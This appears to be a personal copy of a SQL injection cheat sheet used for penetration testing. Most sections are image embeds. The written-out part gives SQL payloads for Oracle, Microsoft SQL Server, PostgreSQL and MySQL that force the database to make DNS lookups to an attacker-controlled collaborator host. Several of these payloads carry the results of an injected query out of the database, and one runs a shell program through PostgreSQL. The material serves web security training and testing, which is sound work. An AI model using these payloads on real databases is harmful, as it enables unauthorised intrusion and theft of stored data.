## String Concatenation
- Below concatenating strings in different databases
![[SQL_injection_cheat_sheet_string_concatenation.png]]

## Substring
- Note that the offset index is 1-based.
- Each of the following expressions will return the string `ba`.
![[SQL_injection_cheat_sheet_substring.png]]

## Comments
![[SQL_injection_cheat_sheet_comments.png]]

## Database version
- You can query the database to determine its type and version.
![[SQL_injection_cheat_sheet_Database_version.png]]

## Database contents
- You can list the tables that exist in the database, and the columns that those tables contain.
![[SQL_injection_cheat_sheet_Database_contents.png]]

## Conditional errors
- You can test a single boolean condition and trigger a database error
![[SQL_injection_cheat_sheet_conditional_error.png]]

## Extracting data via visible error messages
- You can test a single boolean condition and trigger a database error.
![[SQL_injection_cheat_sheet_data_extracting_via_error_messages.png]]

## Batched (or stacked) queries
- You can use batched queries to execute multiple queries in succession.
- Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
![[SQL_injection_cheat_sheet_batched_queries.png]]

## Time delays
- You can cause a time delay in the database when the query is processed.
- The following will cause an unconditional time delay of 10 seconds.
![[SQL_injection_cheat_sheet_time_delays.png]]

## Conditional time delays
- You can test a single boolean condition and trigger a time delay if the condition is true.
![[SQL_injection_cheat_sheet_conditional_time_delays.png]]

## DNS lookup
You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

#### Oracle - 
1. (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:|
**Command** - 
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

2. The following technique works on fully patched Oracle installations, but requires elevated privileges:
**Command** - 
```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

#### Microsoft - 
**Command** - 
```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

#### PostgreSQL - 
**Command** - 
```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

#### MySQL - 
The following techniques work on Windows only:
**Command** - 
```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

## DNS lookup with data exfiltration
- You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query.
- To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

#### Oracle - 
**Command** - 
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

#### Microsoft - 
**Command** - 
```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

#### PostgreSQL - 
**Command** - 
```sql
create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();
```

#### MySQL - 
The following technique works on Windows only
**Command** - 
```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```